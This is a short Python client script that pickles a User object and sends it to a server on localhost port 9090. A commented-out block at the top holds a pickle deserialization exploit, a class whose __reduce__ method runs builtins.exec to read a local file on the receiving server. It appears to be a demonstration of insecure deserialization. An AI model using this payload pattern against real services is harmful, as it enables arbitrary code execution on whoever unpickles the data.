# import socket, pickle, builtins

# HOST = "127.0.0.1"
# PORT = 9090

# class Pickle(object):
#     def __reduce__(self):
#         return (builtins.exec, ("with open('text.txt','r') as r: print(r.readlines())",))

# with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
#     sock.connect((HOST,PORT))
#     sock.sendall(pickle.dumps(Pickle()))

import socket
import sys
import pickle
from user import User

def send_to_server():
    HOST, PORT = "localhost", 9090

    user = User('spam', 'eggs')
    serialized_user = pickle.dumps(user)
    data = serialized_user

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
        sock.connect((HOST, PORT))
        sock.sendall(data)

        received = str(sock.recv(1024), "utf-8")

    print("Sent: {}".format(data))
    print("Received: {}".format(received))

if __name__ == "__main__":
    send_to_server()